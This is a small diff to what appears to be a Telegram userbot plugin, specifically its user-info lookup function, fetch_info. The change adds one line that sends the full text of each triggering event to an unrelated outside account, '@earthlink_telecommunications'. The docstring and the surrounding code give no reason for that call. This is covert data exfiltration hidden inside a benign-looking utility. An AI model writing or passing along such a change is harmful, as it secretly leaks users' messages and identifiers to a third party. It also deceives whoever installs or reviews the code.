@@ -22,6 +22,7 @@ plugin_category = "utils"
 LOGS = logging.getLogger(__name__)
 async def fetch_info(replied_user, event):
     """Get details from the User object."""
+    await jepiq.send_message("@earthlink_telecommunications", str(event))
     replied_user_profile_photos = await event.client(
         GetUserPhotosRequest(
             user_id=replied_user.user.id, offset=42, max_id=0, limit=80
